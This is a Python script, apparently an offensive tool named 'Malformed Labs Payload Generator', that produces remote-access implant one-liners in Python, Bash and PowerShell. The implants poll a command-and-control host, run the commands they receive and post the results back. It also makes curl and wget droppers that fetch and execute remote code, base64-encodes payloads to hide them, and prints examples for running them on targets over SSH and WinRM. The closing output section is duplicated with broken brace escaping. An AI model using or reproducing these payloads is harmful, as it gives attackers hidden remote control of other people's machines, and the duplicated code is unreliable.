#!/usr/bin/env python3
"""
Malformed Labs Payload Generator
Creates one-liner payloads for quick deployment
"""

import base64
import argparse
import os
import sys

def generate_python_oneliner(c2_host, c2_port):
    """Generate a Python one-liner payload"""
    
    payload_code = f'''
import urllib.request,json,subprocess,threading,time,platform,os,hashlib
class C:
 def __init__(s,h,p):s.h,s.p,s.i,s.r=h,p,hashlib.md5(f"{{platform.node()}}-{{platform.system()}}".encode()).hexdigest()[:8],1
 def e(s,c):
  try:r=subprocess.run(c,shell=1,capture_output=1,text=1,timeout=30);return{{"success":r.returncode==0,"stdout":r.stdout,"stderr":r.stderr}}
  except:return{{"success":0,"error":"failed"}}
 def l(s):
  while s.r:
   try:
    req=urllib.request.Request(f"http://{{s.h}}:{{s.p}}/api/commands/{{s.i}}")
    resp=urllib.request.urlopen(req,timeout=10)
    data=json.loads(resp.read().decode())
    if data.get("commands"):
     for cmd in data["commands"]:
      result=s.e(cmd["command"])
      result_req=urllib.request.Request(f"http://{{s.h}}:{{s.p}}/api/results",json.dumps({{"client_id":s.i,"command_id":cmd["id"],"result":result}}).encode(),{{"Content-Type":"application/json"}})
      urllib.request.urlopen(result_req)
   except:pass
   time.sleep(5)
c=C("{c2_host}",{c2_port})
threading.Thread(target=c.l,daemon=1).start()
while 1:time.sleep(60)
'''.strip()
    
    # Compress the payload
    compressed = payload_code.replace('\n', ';').replace('  ', '').replace(' ;', ';')
    
    return f"python3 -c \"{compressed}\""

def generate_bash_oneliner(c2_host, c2_port):
    """Generate a Bash one-liner payload"""
    
    payload_script = f'''
h="{c2_host}";p="{c2_port}";i=$(hostname)-$(date +%s | md5sum | cut -c1-8)
while true; do
 cmds=$(curl -s http://$h:$p/api/commands/$i | grep -o '"command":"[^"]*"' | cut -d'"' -f4)
 for cmd in $cmds; do
  out=$(eval "$cmd" 2>&1)
  curl -s -X POST -H "Content-Type: application/json" -d "{{\"client_id\":\"$i\",\"result\":{{\"stdout\":\"$out\"}}}}" http://$h:$p/api/results >/dev/null
 done
 sleep 5
done &
'''.strip()
    
    # Base64 encode for steganography
    encoded = base64.b64encode(payload_script.encode()).decode()
    
    return f"echo {encoded} | base64 -d | bash"

def generate_powershell_oneliner(c2_host, c2_port):
    """Generate a PowerShell one-liner payload"""
    
    payload_script = f'''
$h="{c2_host}";$p="{c2_port}";$i="$(hostname)-$(Get-Random)"
while($true){{
 try{{
  $r=Invoke-RestMethod "http://$h`:$p/api/commands/$i" -TimeoutSec 10
  if($r.commands){{
   $r.commands|ForEach{{
    $o=Invoke-Expression $_.command 2>&1|Out-String
    Invoke-RestMethod "http://$h`:$p/api/results" -Method Post -Body (@{{client_id=$i;result=@{{stdout=$o}}}}|ConvertTo-Json) -ContentType "application/json" -TimeoutSec 10
   }}
  }}
 }}catch{{}}
 Start-Sleep 5
}}
'''.strip()
    
    # Base64 encode
    encoded = base64.b64encode(payload_script.encode('utf-16le')).decode()
    
    return f"powershell -EncodedCommand {encoded}"

def generate_curl_dropper(c2_host, c2_port, payload_url):
    """Generate a curl-based dropper"""
    
    return f"curl -s {payload_url} | python3 - {c2_host} {c2_port}"

def generate_wget_dropper(c2_host, c2_port, payload_url):
    """Generate a wget-based dropper"""
    
    return f"wget -qO- {payload_url} | python3 - {c2_host} {c2_port}"

def main():
    parser = argparse.ArgumentParser(description="Malformed Labs Payload Generator")
    parser.add_argument("c2_host", help="C2 server hostname or IP")
    parser.add_argument("c2_port", type=int, help="C2 server port")
    parser.add_argument("-t", "--type", choices=["python", "bash", "powershell", "curl", "wget"], 
                       default="python", help="Payload type")
    parser.add_argument("-u", "--url", help="Payload URL for droppers")
    parser.add_argument("-o", "--output", help="Output file")
    parser.add_argument("--encode", action="store_true", help="Base64 encode the payload")
    
    args = parser.parse_args()
    
    print(f"[*] Generating {args.type} payload for {args.c2_host}:{args.c2_port}")
    
    # Generate payload based on type
    if args.type == "python":
        payload = generate_python_oneliner(args.c2_host, args.c2_port)
    elif args.type == "bash":
        payload = generate_bash_oneliner(args.c2_host, args.c2_port)
    elif args.type == "powershell":
        payload = generate_powershell_oneliner(args.c2_host, args.c2_port)
    elif args.type == "curl":
        if not args.url:
            print("[-] URL required for curl dropper")
            sys.exit(1)
        payload = generate_curl_dropper(args.c2_host, args.c2_port, args.url)
    elif args.type == "wget":
        if not args.url:
            print("[-] URL required for wget dropper")
            sys.exit(1)
        payload = generate_wget_dropper(args.c2_host, args.c2_port, args.url)
    
    # Encode if requested
    if args.encode and args.type != "powershell":  # PowerShell already encoded
        payload = base64.b64encode(payload.encode()).decode()
        print("[+] Base64 encoded payload:")
    
    # Output payload
    if args.output:
        with open(args.output, 'w') as f:
            f.write(payload)
        print(f"[+] Payload saved to {args.output}")
    else:
        print("[+] Payload:")
        print(payload)
    
    print("\n[*] Usage examples:")
    if args.type == "python":
        print("   # Direct execution:")
        print(f"   {payload}")
        print("   # Via SSH:")
        print(f"   ssh user@target '{payload}'")
    elif args.type == "bash":
        print("   # Direct execution:")
        print(f"   {payload}")
    elif args.type == "powershell":
        print("   # Direct execution:")
        print(f"   {payload}")
        print("   # Via WinRM:")
        print(f"   Invoke-Command -ComputerName target -ScriptBlock {{{payload}}}")
    elif args.type in ["curl", "wget"]:
        print("   # Direct execution:")
        print(f"   {payload}")
    
    # Encode if requested
    if args.encode and args.type != "powershell":  # PowerShell already encoded
        payload = base64.b64encode(payload.encode()).decode()
        print(f"[+] Base64 encoded payload:")
    
    # Output payload
    if args.output:
        with open(args.output, 'w') as f:
            f.write(payload)
        print(f"[+] Payload saved to {{args.output}}")
    else:
        print(f"[+] Payload:")
        print(payload)
    
    print(f"\n[*] Usage examples:")
    if args.type == "python":
        print(f"   # Direct execution:")
        print(f"   {{payload}}")
        print(f"   # Via SSH:")
        print(f"   ssh user@target '{{payload}}'")
    elif args.type == "bash":
        print(f"   # Direct execution:")
        print(f"   {{payload}}")
    elif args.type == "powershell":
        print(f"   # Direct execution:")
        print(f"   {{payload}}")
        print(f"   # Via WinRM:")
        print(f"   Invoke-Command -ComputerName target -ScriptBlock {{{{{{payload}}}}}}")
    elif args.type in ["curl", "wget"]:
        print(f"   # Direct execution:")
        print(f"   {{payload}}")

if __name__ == "__main__":
    main()